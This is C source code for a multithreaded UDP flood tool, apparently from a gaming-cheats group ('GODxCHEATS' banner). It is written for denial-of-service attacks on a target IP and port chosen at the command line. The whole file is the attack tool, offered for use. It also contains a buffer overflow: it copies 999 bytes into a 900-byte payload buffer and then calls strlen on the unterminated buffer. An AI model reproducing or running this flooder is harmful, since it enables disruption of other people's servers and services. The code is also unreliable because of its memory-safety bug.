#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>

#define PAYLOAD_SIZE 900
#define RANDOM_STRING_SIZE 999  // Length of the random string to be used as payload

// Structure to hold attack parameters
typedef struct {
    char *ip;
    int port;
    int duration;
    int thread_id;
} AttackParams;

// Function to generate a random string as payload
void generate_random_string(char *buffer, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789/";
    for (size_t i = 0; i < size; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size] = '\0';  // Null-terminate the string
}

// Function to send UDP packets efficiently
void* send_udp_packets(void* arg) {
    AttackParams *params = (AttackParams *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];
    char random_string[RANDOM_STRING_SIZE + 1];

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    // Generate random string to use as payload
    generate_random_string(random_string, RANDOM_STRING_SIZE);
    memcpy(payload, random_string, RANDOM_STRING_SIZE);

    time_t endtime = time(NULL) + params->duration;
    while (time(NULL) <= endtime) {
        ssize_t payload_size = strlen(payload);
        if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }

        // Random delay between 50 to 150 ms
        int delay_time = rand() % 100 + 50;
        usleep(delay_time * 1000);  // Convert milliseconds to microseconds
    }

    close(sock);
    return NULL;
}

// Signal handler to stop the attack
void handle_sigint(int sig) {
    printf("\nStopping attack...\n");
    exit(0);
}

// Usage information
void usage() {
    printf("Usage: ./attack ip port duration threads\n");
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    // Register signal handler for SIGINT (Ctrl+C)
    signal(SIGINT, handle_sigint);

    pthread_t thread_ids[threads];
    AttackParams *params[threads];

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);

    // Spawn threads
    for (int i = 0; i < threads; i++) {
        params[i] = (AttackParams *)malloc(sizeof(AttackParams));
        params[i]->ip = ip;
        params[i]->port = port;
        params[i]->duration = duration;
        params[i]->thread_id = i;

        if (pthread_create(&thread_ids[i], NULL, send_udp_packets, params[i]) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Launched thread with ID: %d\n", i);
    }

    // Join threads after completion
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
        free(params[i]);
    }

    printf("***************************************\n");
    printf("*                                  *\n");
    printf("*      ×͜×ㅤ𝙰𝙻𝙾𝙽𝙴ㅤ𝙱𝙾𝚈 ×͜×       *\n");
    printf("*   ꧁༒GODxCHEATS༒꧂.  *\n");
    printf("*                                  *\n");
    printf("***************************************\n");
    
    return 0;
}